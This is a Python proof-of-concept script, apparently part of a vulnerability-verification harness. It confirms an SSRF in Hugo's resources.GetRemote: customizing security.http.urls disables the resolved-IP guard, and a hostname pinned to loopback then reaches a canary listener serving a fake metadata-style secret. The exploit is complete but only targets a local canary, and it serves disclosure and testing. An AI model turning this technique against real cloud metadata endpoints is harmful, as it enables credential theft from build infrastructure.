#!/usr/bin/env python3
"""
VULN-001 — GetRemote dial-time SSRF guard is silently disabled when http.urls is customized
===========================================================================================

VULN-ID     : VULN-001  (merged HUGO-029 = the proxyFromEnvironment variant)
Title       : CheckAllowedHTTPAddress returns nil for EVERY host once security.http.urls != default
Vuln file   : targets/hugo/config/security/securityConfig.go:233-240
              targets/hugo/resources/resource_factories/create/create.go (secureDialer.Control hook)
CWE         : CWE-918 (SSRF) — anti-DNS-rebind guard bypass

The flaw
--------
resources.GetRemote's real SSRF backstop is a dial-time resolved-IP check
(net.Dialer.Control -> CheckAllowedHTTPAddress) that rejects loopback / private /
link-local / CGNAT / cloud-metadata addresses — the ONLY defense against a hostname
that resolves internally, because the security.http.urls allowlist only inspects URL
*text* and never sees the resolved IP. But that guard short-circuits:

    if !slices.Equal(c.HTTP.URLs.patternsStrings, DefaultConfig.HTTP.URLs.patternsStrings) {
        return nil          // resolved-IP guard disabled for EVERY host
    }

i.e. the moment an operator edits security.http.urls *at all* (even to add one trusted
host), the dial-IP guard is disabled globally and only text-regex matching remains.

Exploitation idea
-----------------
Use a hostname `internalcanary.test` that (a) passes the text allowlist — it starts
with a letter, is not `localhost`, has no userinfo, and is not a bare IP literal — but
(b) resolves to 127.0.0.1 (a loopback canary listener). Under DEFAULT config the dial
guard blocks it; after ANY http.urls customization the same fetch reaches the internal
listener. 127.0.0.1 stands in for 169.254.169.254 — the guard treats both the same
(both fail isPublicAddr), so reaching loopback proves the metadata endpoint is reachable.

What a successful run proves
---------------------------
Identical hostname + identical listener; only security.http.urls changes. Default:
the fetch is DENIED at dial and the listener gets no request. Customized: the build
connects to the loopback listener and renders its secret body — SSRF to an address the
guard is supposed to block.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-001"
HOSTNAME = "internalcanary.test"   # passes default text allowlist, but we pin it to loopback
CANARY = "CANARY-" + C.rand()      # unique secret only the internal listener serves


def site(port: int, customized: bool) -> dict:
    url = f"http://{HOSTNAME}:{port}/latest/meta-data/iam/secret"
    # The home template fetches the internal URL and renders the body (or the error).
    # Hugo >=0.141 removed Resource.Err in favour of the `try` keyword: try(...) yields
    # a value with .Err (transport/security error) and .Value (the resource on success).
    layout = (
        "{{- $u := \"%s\" -}}\n"
        "{{- $r := try (resources.GetRemote $u) -}}\n"
        "{{- with $r.Err }}FETCH_ERR:{{ . }}{{ else }}{{ with $r.Value }}FETCHED:{{ .Content }}"
        "{{ else }}FETCH_NIL{{ end }}{{ end -}}\n" % url
    )
    cfg = "baseURL='http://localhost/'\ntitle='h1'\n" \
          "disableKinds=['taxonomy','term','sitemap','rss','404']\n"
    if customized:
        # A realistic operator edit: "allow my hosts". ANY change from the default
        # patternsStrings flips CheckAllowedHTTPAddress into the return-nil branch.
        cfg += "[security.http]\n  urls = ['(?i)^https?://']\n"
    return {"hugo.toml": cfg, "content/_index.md": "---\ntitle: home\n---\n",
            "layouts/index.html": layout}


def build(port: int, customized: bool):
    s = C.make_site(__file__, site(port, customized), name="buildsite_" + ("custom" if customized else "default"))
    # --network host so the container's 127.0.0.1 == the host listener; --add-host pins
    # the passing-hostname to loopback (Go's pure resolver reads /etc/hosts).
    rc, out, public = C.run_hugo(
        s, render_to_memory=False, network="host", memory="1g", timeout=60,
        extra_docker=[f"--add-host={HOSTNAME}:127.0.0.1"])
    html = ""
    if public and os.path.isfile(os.path.join(public, "index.html")):
        html = open(os.path.join(public, "index.html"), encoding="utf-8").read()
    return rc, out, html


def main() -> int:
    C.banner(VULN, "GetRemote dial-IP SSRF guard disabled by any http.urls customization",
             info="exercising config/security/securityConfig.go CheckAllowedHTTPAddress (return nil when urls!=default)",
             target="throwaway `hugo` build -> loopback canary listener")

    with C.OOBListener(payload=(CANARY + "\n").encode()) as oob:
        port = oob.port
        C.log("SETUP", f"internal canary HTTP listener on 127.0.0.1:{port} (serves secret {CANARY!r}); "
                       f"hostname {HOSTNAME} pinned to 127.0.0.1")

        # ---- Baseline: DEFAULT security config -> the guard must block loopback ----
        C.log("STEP", "build #1 with DEFAULT security.http.urls (guard active)")
        n0 = len(oob.records)
        rc0, out0, html0 = build(port, customized=False)
        hits0 = len(oob.records) - n0
        blocked = ("FETCH_ERR:" in html0) or (CANARY not in html0)
        C.log("PROOF", f"default: listener hits={hits0}  canary-in-output={CANARY in html0}  "
                       f"(expect blocked: 0 hits / FETCH_ERR)")
        C.log("INFO", "default output: " + (html0.strip()[:160] or f"(no output; rc={rc0})"))

        # ---- Attack: operator customized http.urls -> guard skipped ----------------
        C.log("STEP", "build #2 with CUSTOMIZED security.http.urls = ['(?i)^https?://'] (guard skipped)")
        n1 = len(oob.records)
        rc1, out1, html1 = build(port, customized=True)
        hits1 = len(oob.records) - n1
        fetched = CANARY in html1
        C.log("PROOF", f"customized: listener hits={hits1}  canary-in-output={fetched}  "
                       f"reached_internal={'YES' if (hits1 > 0 and fetched) else 'no'}")
        C.log("INFO", "customized output: " + (html1.strip()[:160] or f"(no output; rc={rc1})"))

    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"[default]  hits={hits0} blocked={blocked}\n{html0}\n\n"
                 f"[customized] hits={hits1} fetched={fetched}\n{html1}\n")

    if fetched and hits1 > 0 and blocked:
        C.log("OK", f"exploit confirmed — under the DEFAULT allowlist the dial guard BLOCKED the "
                    f"loopback fetch (0 hits), but after a single http.urls edit the same hostname "
                    f"reached 127.0.0.1 and the build rendered the internal secret {CANARY!r}. "
                    f"The resolved-IP anti-rebind guard is disabled by any customization -> SSRF to "
                    f"loopback/private/cloud-metadata.")
        print(f"==> {VULN}: CONFIRMED — customizing security.http.urls disables the SSRF dial-IP guard")
        return 0
    if fetched and hits1 > 0 and not blocked:
        C.log("FAIL", "the DEFAULT build was NOT blocked (guard did not stop loopback) — re-examine baseline")
        print(f"==> {VULN}: NEEDS_MANUAL — customized reached internal, but default baseline not blocked")
        return 1
    C.log("FAIL", f"customized build did not reach the internal listener (hits={hits1}, fetched={fetched})")
    print(f"==> {VULN}: FAILED — SSRF not reproduced")
    return 1


if __name__ == "__main__":
    sys.exit(main())
